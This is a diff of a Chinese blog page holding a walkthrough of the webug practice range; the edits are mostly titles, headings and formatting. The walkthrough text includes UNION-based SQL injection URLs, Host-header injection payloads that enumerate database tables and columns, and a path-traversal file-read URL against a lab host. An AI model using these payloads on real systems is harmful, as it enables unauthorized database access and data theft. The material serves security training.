@@ -79,20 +79,20 @@
 
 
 
-<meta name="description" content="基础 普通的GET注入一道简单的sql注入   暴库http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+ 爆表http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%2">
+<meta name="description" content="0x01 基础 普通的GET注入一道简单的sql注入   暴库http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+ 爆表http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hu3sky">
+<meta property="og:title" content="webug wp">
 <meta property="og:url" content="http://yoursite.com/2018/04/17/webug wp/index.html">
 <meta property="og:site_name" content="Hu3sky">
-<meta property="og:description" content="基础 普通的GET注入一道简单的sql注入   暴库http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+ 爆表http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%2">
+<meta property="og:description" content="0x01 基础 普通的GET注入一道简单的sql注入   暴库http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+ 爆表http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/04/17/webug%20wp/1.png">
-<meta property="og:image" content="http://yoursite.com/2018/04/17/webug%20wp/2.png">
-<meta property="og:updated_time" content="2018-04-17T10:54:15.022Z">
+<meta property="og:image" content="http://yoursite.com/ctf/1.png">
+<meta property="og:image" content="http://yoursite.com/ctf/2.png">
+<meta property="og:updated_time" content="2018-04-17T12:27:24.132Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hu3sky">
-<meta name="twitter:description" content="基础 普通的GET注入一道简单的sql注入   暴库http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+ 爆表http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%2">
-<meta name="twitter:image" content="http://yoursite.com/2018/04/17/webug%20wp/1.png">
+<meta name="twitter:title" content="webug wp">
+<meta name="twitter:description" content="0x01 基础 普通的GET注入一道简单的sql注入   暴库http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1%27%20union%20select%201,2,3,database()--+ 爆表http://222.18.158.245:6022/pentest/test/sqli/sqltamp.php?gid=1">
+<meta name="twitter:image" content="http://yoursite.com/ctf/1.png">
 
 
 
@@ -128,7 +128,7 @@
 
 
 
-  <title> | Hu3sky</title>
+  <title>webug wp | Hu3sky</title>
   
 
 
@@ -283,7 +283,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline"></h1>
+          <h1 class="post-title" itemprop="name headline">webug wp</h1>
         
 
         <div class="post-meta">
@@ -305,6 +305,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-up/" itemprop="url" rel="index">
+                    <span itemprop="name">write up</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -333,7 +355,7 @@
       
 
       
-        <h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><ol>
+        <h1 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h1><ol>
 <li>普通的GET注入<br>一道简单的sql注入</li>
 </ol>
 <ul>
@@ -357,20 +379,20 @@
 </li>
 </ol>
 <p>抓包。改referer为<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 改host为 10.10.10.10<br>得到flag</p>
-<h1 id="中级"><a href="#中级" class="headerlink" title="中级"></a>中级</h1><ol>
+<h1 id="0x02-中级"><a href="#0x02-中级" class="headerlink" title="0x02 中级"></a>0x02 中级</h1><ol>
 <li>出来点东西吧<br>任意文件读取<br><a href="http://222.18.158.245:6022/pentest/test/13/../../../../index.php" target="_blank" rel="noopener">http://222.18.158.245:6022/pentest/test/13/../../../../index.php</a></li>
 <li>提交的方式怎么样啊<br>抓包 看到了提交方式为post</li>
 </ol>
-<p><img src="1.png" alt="x"><br>改post处<br><img src="2.png" alt="x">看到 出现了index的首页</p>
+<p><img src="/ctf/1.png" alt="x"><br>改post处<br><img src="/ctf/2.png" alt="x">看到 出现了index的首页</p>
 <ol>
 <li>我还是一个注入<br>在页面试了很久 没什么反应，所以应该不是url的普通注入或是盲注。<br>burpsuite抓包试试。本题是一个在host处的注入。</li>
 </ol>
 <ul>
-<li>测试字段数：<br>Host: union select 1,2,3,4#</li>
-<li>数据库名称：<br>Host: union select 1,2,3,database()#</li>
-<li>表名：<br>Host: union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=’pentesterlab’#</li>
-<li>列名：<br>Host: union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’flag’#</li>
-<li>获取flag：<br>Host: union select 1,2,3,flag from <code>flag</code>#</li>
+<li>测试字段数：<br><code>Host: union select 1,2,3,4#</code></li>
+<li>数据库名称：<br><code>Host: union select 1,2,3,database()#</code></li>
+<li>表名：<br><code>Host: union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#39;pentesterlab&#39;#</code></li>
+<li>列名：<br><code>Host: union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;#</code></li>
+<li>获取flag：<br>Host: union select 1,2,3,flag from `flag`#</li>
 </ul>
 <ol>
 <li><p>APK里面有flag<br>做不来做不来。看盛大佬的wp吧<br>我说下我是这么做的。。开了个鼠标连点器。。。毕竟只需要点300次嘛 强行get flag</p>
@@ -504,7 +526,7 @@
               
               <div class="site-state-item site-state-categories">
                 
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">分类</span>
                 
               </div>
@@ -539,7 +561,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基础"><span class="nav-number">1.</span> <span class="nav-text">基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#中级"><span class="nav-number">2.</span> <span class="nav-text">中级</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-基础"><span class="nav-number">1.</span> <span class="nav-text">0x01 基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-中级"><span class="nav-number">2.</span> <span class="nav-text">0x02 中级</span></a></li></ol></div>
             
 
           </div>
